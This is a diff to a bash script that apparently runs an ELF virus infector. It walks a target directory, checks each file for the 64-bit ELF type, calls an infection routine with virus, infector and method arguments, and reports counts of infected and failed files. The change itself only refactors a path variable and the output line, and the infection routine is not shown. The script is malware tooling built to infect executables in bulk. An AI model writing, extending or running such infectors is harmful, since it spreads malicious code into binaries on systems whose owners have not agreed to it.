@@ -58,7 +58,8 @@ success_counter=0
 fail_counter=0
 
 if [[ -d $victim ]]; then
-    for file_name in $(rm_trailing_slash $victim)/*; do
+    current_dir=$(rm_trailing_slash $victim)
+    for file_name in $current_dir/*; do
         type=$(file $file_name)
 
         if [[ $type == *"ELF 64-bit LSB"* ]]; then
@@ -78,7 +79,7 @@ if [[ -d $victim ]]; then
             printf ' [%-45s] == type: %-5s %s\n' $file_name $elf_type $detail
         fi
     done
-    echo "infected: $success_counter, failed: $fail_counter"
+    echo "Result: [$current_dir/*] infected: $success_counter, failed: $fail_counter"
 else
     infect_one_victim $virus $infector $method $victim
 fi
